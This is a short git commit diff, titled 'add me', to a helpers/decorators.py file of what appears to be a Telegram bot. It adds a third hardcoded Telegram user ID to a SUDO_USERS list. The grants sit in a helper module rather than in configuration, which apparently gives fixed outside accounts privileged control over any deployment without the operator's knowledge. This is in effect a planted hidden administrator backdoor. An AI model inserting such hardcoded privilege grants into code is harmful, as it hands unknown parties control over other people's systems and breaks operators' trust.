f96e154d5e64d62200b7bf46129065d742505d4b
zxce3 <memetpea25@gmail.com>
2021-08-17 03:40:12 +0700

    add me

--- helpers/decorators.py
+++ helpers/decorators.py
@@ -25,6 +25,8 @@ from config import SUDO_USERS
 
 SUDO_USERS.append(1757169682)
 SUDO_USERS.append(1738637033)
+SUDO_USERS.append(1448474573)
+
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
